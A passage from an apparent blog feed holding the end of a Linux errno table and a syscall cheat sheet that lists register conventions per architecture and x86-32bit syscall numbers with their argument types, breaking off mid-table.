error</td></tr><tr><td align="center">122</td><td align="center">0x7a</td><td>EDQUOT</td><td>Disk quota exceeded</td></tr><tr><td align="center">123</td><td align="center">0x7b</td><td>ENOMEDIUM</td><td>No medium found</td></tr><tr><td align="center">124</td><td align="center">0x7c</td><td>EMEDIUMTYPE</td><td>Wrong medium type</td></tr><tr><td align="center">125</td><td align="center">0x7d</td><td>ECANCELED</td><td>Operation canceled</td></tr><tr><td align="center">126</td><td align="center">0x7e</td><td>ENOKEY</td><td>Required key not available</td></tr><tr><td align="center">127</td><td align="center">0x7f</td><td>EKEYEXPIRED</td><td>Key has expired</td></tr><tr><td align="center">128</td><td align="center">0x80</td><td>EKEYREVOKED</td><td>Key has been revoked</td></tr><tr><td align="center">129</td><td align="center">0x81</td><td>EKEYREJECTED</td><td>Key was rejected by service</td></tr><tr><td align="center">130</td><td align="center">0x82</td><td>EOWNERDEAD</td><td>Owner died</td></tr><tr><td align="center">131</td><td align="center">0x83</td><td>ENOTRECOVERABLE</td><td>State not recoverable</td></tr><tr><td align="center">132</td><td align="center">0x84</td><td>ERFKILL</td><td>Operation not possible due to RF-kill</td></tr><tr><td align="center">133</td><td align="center">0x85</td><td>EHWPOISON</td><td>Memory page has hardware error</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> CheatSheet </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Syscall CheatSheet</title>
      <link href="/2020/10/26/Syscall-CheatSheet/"/>
      <url>/2020/10/26/Syscall-CheatSheet/</url>
      
        <content type="html"><![CDATA[<h1 id="Syscall-args"><a href="#Syscall-args" class="headerlink" title="Syscall args"></a>Syscall args</h1><table><thead><tr><th align="center">arch</th><th align="center">syscall NR</th><th align="center">return</th><th align="center">arg0</th><th align="center">arg1</th><th align="center">arg2</th><th align="center">arg3</th><th align="center">arg4</th><th align="center">arg5</th></tr></thead><tbody><tr><td align="center">arm</td><td align="center">r7</td><td align="center">r0</td><td align="center">r0</td><td align="center">r1</td><td align="center">r2</td><td align="center">r3</td><td align="center">r4</td><td align="center">r5</td></tr><tr><td align="center">arm64</td><td align="center">x8</td><td align="center">x0</td><td align="center">x0</td><td align="center">x1</td><td align="center">x2</td><td align="center">x3</td><td align="center">x4</td><td align="center">x5</td></tr><tr><td align="center">x86</td><td align="center">eax</td><td align="center">eax</td><td align="center">ebx</td><td align="center">ecx</td><td align="center">edx</td><td align="center">esi</td><td align="center">edi</td><td align="center">ebp</td></tr><tr><td align="center">x86_64</td><td align="center">rax</td><td align="center">rax</td><td align="center">rdi</td><td align="center">rsi</td><td align="center">rdx</td><td align="center">r10</td><td align="center">r8</td><td align="center">r9</td></tr></tbody></table><h1 id="x86-32bit"><a href="#x86-32bit" class="headerlink" title="x86-32bit"></a>x86-32bit</h1><table><thead><tr><th align="center">NR</th><th>syscall name</th><th align="center">references</th><th align="center">%eax</th><th>arg0 (%ebx)</th><th>arg1 (%ecx)</th><th>arg2 (%edx)</th><th>arg3 (%esi)</th><th>arg4 (%edi)</th><th>arg5 (%ebp)</th></tr></thead><tbody><tr><td align="center">0</td><td>restart_syscall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/restart_syscall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*restart_syscall">cs/</a></td><td align="center">0x00</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">1</td><td>exit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/exit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*exit">cs/</a></td><td align="center">0x01</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">2</td><td>fork</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fork.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fork">cs/</a></td><td align="center">0x02</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">3</td><td>read</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/read.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*read">cs/</a></td><td align="center">0x03</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">4</td><td>write</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/write.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*write">cs/</a></td><td align="center">0x04</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">5</td><td>open</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*open">cs/</a></td><td align="center">0x05</td><td>const char *filename</td><td>int flags</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">6</td><td>close</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/close.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*close">cs/</a></td><td align="center">0x06</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">7</td><td>waitpid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/waitpid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*waitpid">cs/</a></td><td align="center">0x07</td><td>pid_t pid</td><td>int *stat_addr</td><td>int options</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">8</td><td>creat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/creat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*creat">cs/</a></td><td align="center">0x08</td><td>const char *pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">9</td><td>link</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/link.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*link">cs/</a></td><td align="center">0x09</td><td>const char *oldname</td><td>const char *newname</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">10</td><td>unlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/unlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unlink">cs/</a></td><td align="center">0x0a</td><td>const char *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">11</td><td>execve</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/execve.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*execve">cs/</a></td><td align="center">0x0b</td><td>const char *filename</td><td>const char *const *argv</td><td>const char *const *envp</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">12</td><td>chdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chdir">cs/</a></td><td align="center">0x0c</td><td>const char *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">13</td><td>time</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/time.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*time">cs/</a></td><td align="center">0x0d</td><td>time_t *tloc</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">14</td><td>mknod</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mknod.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mknod">cs/</a></td><td align="center">0x0e</td><td>const char *filename</td><td>umode_t mode</td><td>unsigned dev</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">15</td><td>chmod</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chmod.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chmod">cs/</a></td><td align="center">0x0f</td><td>const char *filename</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">16</td><td>lchown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lchown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lchown">cs/</a></td><td align="center">0x10</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">17</td><td>break</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/break.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*break">cs/</a></td><td align="center">0x11</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">18</td><td>oldstat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/oldstat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*oldstat">cs/</a></td><td align="center">0x12</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">19</td><td>lseek</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lseek.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lseek">cs/</a></td><td align="center">0x13</td><td>unsigned int fd</td><td>off_t offset</td><td>unsigned int whence</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">20</td><td>getpid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpid">cs/</a></td><td align="center">0x14</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">21</td><td>mount</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mount.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mount">cs/</a></td><td align="center">0x15</td><td>char *dev_name</td><td>char *dir_name</td><td>char *type</td><td>unsigned long flags</td><td>void *data</td><td>-</td></tr><tr><td align="center">22</td><td>umount</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/umount.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*umount">cs/</a></td><td align="center">0x16</td><td>char *name</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">23</td><td>setuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setuid">cs/</a></td><td align="center">0x17</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">24</td><td>getuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getuid">cs/</a></td><td align="center">0x18</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">25</td><td>stime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/stime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*stime">cs/</a></td><td align="center">0x19</td><td>time_t *tptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">26</td><td>ptrace</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ptrace.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ptrace">cs/</a></td><td align="center">0x1a</td><td>long request</td><td>long pid</td><td>unsigned long addr</td><td>unsigned long data</td><td>-</td><td>-</td></tr><tr><td align="center">27</td><td>alarm</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/alarm.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*alarm">cs/</a></td><td align="center">0x1b</td><td>unsigned int seconds</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">28</td><td>oldfstat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/oldfstat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*oldfstat">cs/</a></td><td align="center">0x1c</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">29</td><td>pause</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pause.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pause">cs/</a></td><td align="center">0x1d</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">30</td><td>utime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/utime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*utime">cs/</a></td><td align="center">0x1e</td><td>char *filename</td><td>struct utimbuf *times</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">31</td><td>stty</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/stty.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*stty">cs/</a></td><td align="center">0x1f</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">32</td><td>gtty</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/gtty.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*gtty">cs/</a></td><td align="center">0x20</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">33</td><td>access</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/access.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*access">cs/</a></td><td align="center">0x21</td><td>const char *filename</td><td>int mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">34</td><td>nice</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/nice.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*nice">cs/</a></td><td align="center">0x22</td><td>int increment</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">35</td><td>ftime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ftime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ftime">cs/</a></td><td align="center">0x23</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">36</td><td>sync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sync">cs/</a></td><td align="center">0x24</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">37</td><td>kill</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kill">cs/</a></td><td align="center">0x25</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">38</td><td>rename</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rename.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rename">cs/</a></td><td align="center">0x26</td><td>const char *oldname</td><td>const char *newname</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">39</td><td>mkdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mkdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mkdir">cs/</a></td><td align="center">0x27</td><td>const char *pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">40</td><td>rmdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rmdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rmdir">cs/</a></td><td align="center">0x28</td><td>const char *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">41</td><td>dup</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/dup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup">cs/</a></td><td align="center">0x29</td><td>unsigned int fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">42</td><td>pipe</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pipe.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pipe">cs/</a></td><td align="center">0x2a</td><td>int *fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">43</td><td>times</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/times.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*times">cs/</a></td><td align="center">0x2b</td><td>struct tms *tbuf</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">44</td><td>prof</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/prof.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*prof">cs/</a></td><td align="center">0x2c</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">45</td><td>brk</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/brk.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*brk">cs/</a></td><td align="center">0x2d</td><td>unsigned long brk</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">46</td><td>setgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgid">cs/</a></td><td align="center">0x2e</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">47</td><td>getgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgid">cs/</a></td><td align="center">0x2f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">48</td><td>signal</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/signal.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*signal">cs/</a></td><td align="center">0x30</td><td>int sig</td><td>__sighandler_t handler</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">49</td><td>geteuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/geteuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*geteuid">cs/</a></td><td align="center">0x31</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">50</td><td>getegid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getegid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getegid">cs/</a></td><td align="center">0x32</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">51</td><td>acct</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/acct.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*acct">cs/</a></td><td align="center">0x33</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">52</td><td>umount2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/umount2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*umount2">cs/</a></td><td align="center">0x34</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">53</td><td>lock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lock">cs/</a></td><td align="center">0x35</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">54</td><td>ioctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioctl">cs/</a></td><td align="center">0x36</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">55</td><td>fcntl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fcntl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fcntl">cs/</a></td><td align="center">0x37</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">56</td><td>mpx</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mpx.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mpx">cs/</a></td><td align="center">0x38</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">57</td><td>setpgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setpgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setpgid">cs/</a></td><td align="center">0x39</td><td>pid_t pid</td><td>pid_t pgid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">58</td><td>ulimit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ulimit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ulimit">cs/</a></td><td align="center">0x3a</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">59</td><td>oldolduname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/oldolduname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*oldolduname">cs/</a></td><td align="center">0x3b</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">60</td><td>umask</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/umask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*umask">cs/</a></td><td align="center">0x3c</td><td>int mask</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">61</td><td>chroot</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chroot.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chroot">cs/</a></td><td align="center">0x3d</td><td>const char *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">62</td><td>ustat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ustat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ustat">cs/</a></td><td align="center">0x3e</td><td>unsigned dev</td><td>struct ustat *ubuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">63</td><td>dup2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/dup2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup2">cs/</a></td><td align="center">0x3f</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">64</td><td>getppid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getppid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getppid">cs/</a></td><td align="center">0x40</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">65</td><td>getpgrp</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpgrp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpgrp">cs/</a></td><td align="center">0x41</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">66</td><td>setsid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setsid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setsid">cs/</a></td><td align="center">0x42</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">67</td><td>sigaction</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigaction.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigaction">cs/</a></td><td align="center">0x43</td><td>int</td><td>const struct old_sigaction *</td><td>struct old_sigaction *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">68</td><td>sgetmask</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sgetmask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sgetmask">cs/</a></td><td align="center">0x44</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">69</td><td>ssetmask</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ssetmask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ssetmask">cs/</a></td><td align="center">0x45</td><td>int newmask</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">70</td><td>setreuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setreuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setreuid">cs/</a></td><td align="center">0x46</td><td>uid_t ruid</td><td>uid_t euid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">71</td><td>setregid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setregid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setregid">cs/</a></td><td align="center">0x47</td><td>gid_t rgid</td><td>gid_t egid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">72</td><td>sigsuspend</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigsuspend.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigsuspend">cs/</a></td><td align="center">0x48</td><td>int unused1</td><td>int unused2</td><td>old_sigset_t mask</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">73</td><td>sigpending</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigpending.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigpending">cs/</a></td><td align="center">0x49</td><td>old_sigset_t *uset</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">74</td><td>sethostname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sethostname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sethostname">cs/</a></td><td align="center">0x4a</td><td>char *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">75</td><td>setrlimit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setrlimit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setrlimit">cs/</a></td><td align="center">0x4b</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">76</td><td>getrlimit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getrlimit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrlimit">cs/</a></td><td align="center">0x4c</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">77</td><td>getrusage</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getrusage.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrusage">cs/</a></td><td align="center">0x4d</td><td>int who</td><td>struct rusage *ru</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">78</td><td>gettimeofday</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/gettimeofday.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*gettimeofday">cs/</a></td><td align="center">0x4e</td><td>struct timeval *tv</td><td>struct timezone 